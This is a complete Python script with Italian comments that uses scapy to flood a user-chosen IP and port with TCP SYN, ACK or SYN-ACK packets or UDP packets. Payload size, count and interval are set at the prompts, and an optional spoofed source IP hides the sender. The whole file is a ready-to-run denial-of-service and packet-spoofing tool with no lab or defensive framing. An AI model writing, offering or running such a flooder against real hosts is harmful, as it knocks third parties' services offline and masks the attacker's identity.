import time
import keyboard  # Importiamo il modulo keyboard
from scapy.all import IP, TCP, UDP, send, Raw

def packet_sender(target, port, packet_count, interval, protocol, packet_size, flag=None, spoofed_ip=None):
    try:
        # Calcola la dimensione effettiva del payload in byte
        payload = Raw(b"A" * packet_size)  # Riempimento di dati per raggiungere la dimensione desiderata
        
        for i in range(packet_count):
            # Verifica se il tasto ESC è premuto per interrompere il programma
            if keyboard.is_pressed('esc'):  # Controllo del tasto ESC
                print("\nInterruzione del programma. Tasto ESC premuto.")
                break  # Interrompe il ciclo e quindi l'invio dei pacchetti

            try:
                # Creazione del pacchetto IP
                ip_layer = IP(dst=target)
                
                # Configurazione del pacchetto in base al protocollo selezionato
                if protocol == "TCP":
                    if flag:
                        transport_layer = TCP(dport=port, flags=flag)
                    else:
                        print("Per TCP, è necessario specificare un flag valido.")
                        return
                elif protocol == "UDP":
                    transport_layer = UDP(dport=port)
                
                # Creazione del pacchetto completo
                packet = ip_layer / transport_layer / payload  # Aggiunta del payload
                
                # Imposta un IP sorgente fittizio se specificato
                if spoofed_ip:
                    packet[IP].src = spoofed_ip
                
                # Invia il pacchetto
                send(packet, verbose=False)
                print(f"Pacchetto {protocol} inviato a {target}:{port} con IP sorgente {packet[IP].src} - Dimensione: {packet_size} byte")
                
                # Pausa tra i pacchetti
                time.sleep(interval)
            
            except Exception as e:
                print(f"Errore nell'invio del pacchetto {i+1}: {e}")
        
        print("Invio dei pacchetti completato.")
    
    except Exception as e:
        print(f"Errore durante la preparazione dei pacchetti: {e}")

# Input dell'utente
target = input("Inserisci l'indirizzo IP o il dominio del target: ")
port = int(input("Inserisci la porta del target (ad esempio 80 per HTTP): "))
packet_count = int(input("Inserisci il numero di pacchetti da inviare: "))
interval = float(input("Inserisci l'intervallo tra i pacchetti in secondi: "))
protocol = input("Inserisci il protocollo ('TCP' o 'UDP'): ").upper()
packet_size_unit = input("Inserisci la dimensione del pacchetto e l'unità ('B' per byte o 'KB' per kilobyte): ").upper()

# Calcola la dimensione del payload in byte
try:
    if packet_size_unit.endswith("KB"):
        packet_size = int(packet_size_unit.replace("KB", "")) * 1024
    elif packet_size_unit.endswith("B"):
        packet_size = int(packet_size_unit.replace("B", ""))
    else:
        print("Unità di dimensione non valida. Usa 'B' per byte o 'KB' per kilobyte.")
        packet_size = 0
except ValueError:
    print("Inserisci una dimensione valida.")
    packet_size = 0

spoofed_ip = input("Inserisci l'IP sorgente camuffato (lascia vuoto per usare l'IP reale): ")

if protocol == "TCP":
    flag = input("Inserisci il tipo di pacchetto TCP ('SYN', 'ACK' o 'SYN-ACK'): ").upper()
    if flag not in ['SYN', 'ACK', 'SYN-ACK']:
        print("Flag non valido. Usa 'SYN' per SYN, 'ACK' per ACK o 'SYN-ACK' per pacchetti SYN-ACK.")
    else:
        tcp_flag = {
            'SYN': 'S',
            'ACK': 'A',
            'SYN-ACK': 'SA'
        }[flag]
        packet_sender(target, port, packet_count, interval, protocol, packet_size, tcp_flag, spoofed_ip if spoofed_ip else None)
elif protocol == "UDP":
    packet_sender(target, port, packet_count, interval, protocol, packet_size, spoofed_ip=spoofed_ip if spoofed_ip else None)
else:
    print("Protocollo non valido. Usa 'TCP' o 'UDP'.")
